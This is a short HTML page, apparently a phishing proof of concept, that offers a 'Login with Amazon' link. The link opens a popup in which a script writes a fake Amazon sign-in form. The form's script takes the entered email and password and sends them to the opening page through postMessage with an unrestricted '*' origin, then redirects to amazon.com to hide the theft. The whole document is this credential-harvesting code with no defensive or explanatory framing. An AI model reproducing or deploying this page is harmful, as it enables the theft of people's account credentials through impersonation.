<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <a href="#" onclick="f()">Login with Amazon</a>
    <script>
        function next() {
            w.location.replace('http://www.google.com/csi');
        }
      
        function f() {
          const htmlContent = `<!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class="login-form"><h2>Amazon Sign-In</h2><form id="loginForm"><input type="email" id="email" placeholder="Email or mobile number"><input type="password" id="password" placeholder="Password"><button type="submit">Sign in</button></form></div><script>document.getElementById('loginForm').onsubmit=function(e){e.preventDefault();const email=document.getElementById('email').value;const password=document.getElementById('password').value;window.opener.postMessage({type:'credentials',email:email,password:password},'*');window.location.href='https://amazon.com';};<\\/script></body></html>`;
          w = window.open("javascript:document.write('" + htmlContent + "');location='http://amazon.com'","new","width=500,height=500");
            i = setInterval(function() {
                try { 
                    x = w.location.href; 
                } catch(e) { 
                    clearInterval(i); 
                    next(); 
                }
            }, 1);
        }
    </script>
</body>
</html>
